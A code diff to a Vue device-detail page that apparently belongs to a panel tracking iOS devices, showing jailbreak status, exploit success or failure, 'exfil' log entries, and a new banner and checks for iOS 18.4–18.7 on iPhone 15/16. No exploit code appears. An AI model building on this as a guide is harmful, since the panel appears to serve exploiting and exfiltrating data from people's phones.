@@ -1,6 +1,18 @@
 <template>
   <div class="device-detail">
     <el-button @click="$router.back()" style="margin-bottom: 20px;">返回</el-button>
+    
+    <el-alert
+      title="系统兼容性说明"
+      type="info"
+      :closable="false"
+      show-icon
+      style="margin-bottom: 20px;"
+    >
+      <p><strong>支持的iOS版本：</strong>iOS 18.4 - iOS 18.7</p>
+      <p><strong>支持的设备型号：</strong>iPhone 15系列、iPhone 16系列（搭载A17 Pro / A18芯片）</p>
+    </el-alert>
+    
     <el-card title="设备信息" v-if="device">
       <el-descriptions :column="2">
         <el-descriptions-item label="设备UUID">{{ device.device_uuid }}</el-descriptions-item>
@@ -13,7 +25,10 @@
         <el-descriptions-item label="越狱状态">
           <el-tag :type="getJailbrokenTag(device.jailbroken)">{{ getJailbrokenText(device.jailbroken) }}</el-tag>
         </el-descriptions-item>
-        <el-descriptions-item label="系统版本">{{ device.os_version || "-" }}</el-descriptions-item>
+        <el-descriptions-item label="iOS版本">{{ device.os_version || "-" }}</el-descriptions-item>
+        <el-descriptions-item label="兼容性">
+          <el-tag :type="getCompatibilityTag(device)">{{ getCompatibilityText(device) }}</el-tag>
+        </el-descriptions-item>
         <el-descriptions-item label="设备型号">{{ device.device_model || "-" }}</el-descriptions-item>
         <el-descriptions-item label="芯片型号">{{ device.chipset || "-" }}</el-descriptions-item>
         <el-descriptions-item label="漏洞状态">
@@ -156,6 +171,42 @@ function getExploitText(status) {
   if (status === "success") return "漏洞利用成功"
   if (status === "failed") return "漏洞利用失败"
   return "等待利用"
+}
+function getCompatibilityTag(device) {
+  if (!device.os_version) return 'info'
+  
+  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
+  if (supportedVersions.includes(device.os_version)) {
+    return 'success'
+  }
+  
+  const versionParts = device.os_version.split('.').map(Number)
+  const major = versionParts[0] || 0
+  const minor = versionParts[1] || 0
+  
+  if (major < 18 || (major === 18 && minor < 4)) {
+    return 'danger'
+  }
+  
+  return 'warning'
+}
+function getCompatibilityText(device) {
+  if (!device.os_version) return '未知'
+  
+  const supportedVersions = ['18.4', '18.5', '18.6', '18.7']
+  if (supportedVersions.includes(device.os_version)) {
+    return '兼容'
+  }
+  
+  const versionParts = device.os_version.split('.').map(Number)
+  const major = versionParts[0] || 0
+  const minor = versionParts[1] || 0
+  
+  if (major < 18 || (major === 18 && minor < 4)) {
+    return '版本过低'
+  }
+  
+  return '版本过高'
 }
 function getLogTypeTag(type) {
   const tags = { ios: "danger", exfil: "danger", request: "info", frontend: "warning", api: "success" }
